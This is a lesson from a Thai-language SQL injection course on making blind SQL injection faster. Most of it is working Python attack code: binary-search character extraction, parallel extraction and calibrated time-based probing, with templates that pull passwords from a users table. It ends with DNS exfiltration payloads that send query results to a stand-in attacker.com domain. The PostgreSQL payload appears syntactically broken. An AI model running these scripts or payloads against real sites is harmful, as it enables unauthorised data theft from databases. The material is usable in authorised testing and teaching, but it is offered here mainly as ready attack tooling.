# Part 067: Blind SQLi Optimization และ Performance Tuning

## ภาพรวม

เทคนิคเพิ่มประสิทธิภาพของ Boolean Blind และ Time-based SQLi

**ขั้นตอนที่ 1076-1090**

---

## 1076. Binary Search ใน Blind SQLi

```python
# โดยทั่วไป blind SQLi ค้น หนึ่ง character ใช้ ~128 requests
# Binary search ผ่านแค่ 7 requests

import requests
from typing import Callable

def binary_search_char(
    is_greater: Callable[[int], bool],
    low: int = 32,
    high: int = 126
) -> str:
    """
    หา ASCII code ของ character ด้วย binary search
    is_greater: func ที่รับ ASCII value และคืน True ถ้า target > value
    """
    while low <= high:
        mid = (low + high) // 2
        if is_greater(mid):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def extract_string_binary(
    url: str,
    sqli_template: str,  # template มี {pos} และ {mid}
    length: int,
    check_true: Callable[[str], bool]
) -> str:
    """
    Extract string ด้วย binary search
    sqli_template example: "1 AND ASCII(SUBSTR(password,{pos},1))>{mid}-- -"
    """
    result = ''
    
    for pos in range(1, length + 1):
        def is_greater(mid: int, pos=pos) -> bool:
            payload = sqli_template.format(pos=pos, mid=mid)
            r = requests.get(url, params={'id': payload}, timeout=5)
            return check_true(r.text)
        
        char = binary_search_char(is_greater)
        result += char
        print(f"\r[*] Extracting: {result}", end='', flush=True)
        
        if char == chr(32):  # space at end = done
            break
    
    print()
    return result

# Usage:
# template = "1 AND ASCII(SUBSTR((SELECT password FROM users WHERE id=1),{pos},1))>{mid}-- -"
# result = extract_string_binary('http://target/item', template, 32, lambda t: 'Product Found' in t)
```

---

## 1077. Parallel Extraction

```python
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

def extract_parallel(url: str, query: str, max_workers: int = 5) -> str:
    """
    Extract หลาย characters พร้อมกัน
    """
    # ก่อนอื่น: หา length
    length = get_length(url, query)
    print(f"String length: {length}")
    
    chars = [''] * length
    
    def extract_char(pos: int):
        template = f"1 AND ASCII(SUBSTR(({query}),{pos},1))>{{mid}}-- -"
        char = binary_search_char(
            lambda mid: check_condition(url, template.format(mid=mid))
        )
        chars[pos - 1] = char
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(extract_char, range(1, length + 1))
    
    return ''.join(chars)

def get_length(url: str, query: str) -> int:
    """Get string length with binary search"""
    low, high = 1, 100
    while low <= high:
        mid = (low + high) // 2
        payload = f"1 AND LENGTH(({query}))>{mid}-- -"
        if check_condition(url, payload):
            low = mid + 1
        else:
            high = mid - 1
    return low

def check_condition(url: str, payload: str) -> bool:
    r = requests.get(url, params={'id': payload}, timeout=5)
    return 'Product Found' in r.text
```

---

## 1078. Time-based Optimization

```python
import time
import statistics

def calibrate_delay(url: str, normal_payload: str, sleep_payload: str, samples: int = 3) -> float:
    """
    Calibrate threshold สำหรับ time-based blind SQLi
    คำนวณ baseline + std dev
    """
    normal_times = []
    for _ in range(samples):
        start = time.time()
        requests.get(url, params={'id': normal_payload}, timeout=10)
        normal_times.append(time.time() - start)
    
    baseline = statistics.mean(normal_times)
    std_dev = statistics.stdev(normal_times) if len(normal_times) > 1 else 0.5
    
    # threshold = baseline + 2*std_dev + margin
    threshold = baseline + (2 * std_dev) + 1.0
    print(f"Baseline: {baseline:.3f}s, StdDev: {std_dev:.3f}s, Threshold: {threshold:.3f}s")
    return threshold

def time_based_char(
    url: str,
    template: str,  # มี {pos} {mid} {delay}
    pos: int,
    threshold: float,
    delay: float = 2.0
) -> str:
    """Binary search สำหรับ time-based blind"""
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        payload = template.format(pos=pos, mid=mid, delay=delay)
        
        start = time.time()
        try:
            requests.get(url, params={'id': payload}, timeout=delay + 3)
        except requests.Timeout:
            pass
        elapsed = time.time() - start
        
        if elapsed >= threshold:
            low = mid + 1  # ASCII > mid, delay เกิดขึ้น
        else:
            high = mid - 1
    
    return chr(low)
```

---

## 1079. DNS-based Blind (เร็วที่สุด)

```sql
-- DNS-based blind เร็วกว่า time-based มาก
-- ไม่ต้องรอ delay, ดูผลใน DNS logs

-- MySQL (Windows only):
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))-- -

-- MSSQL:
' EXEC xp_dirtree '\\\\'+(SELECT TOP 1 name FROM sys.objects)+'.attacker.com\\x'-- -

-- PostgreSQL:
' COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'nslookup '+password+'.attacker.com'-- -

-- ใช้ interactsh เป็น DNS listener:
# interactsh-client -server https://interactsh.com
# ผลที่ได้: .interactsh.com แสดง DNS lookup ของ target
```

---

## สรุป

Blind SQLi Optimization:
- **Binary search** - ลดจาก 128 เหลือ 7 requests/char
- **Parallel extraction** - ThreadPoolExecutor
- **Calibrated threshold** - baseline + statistical analysis
- **DNS-based** - เร็วที่สุด

---

*Part 067 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
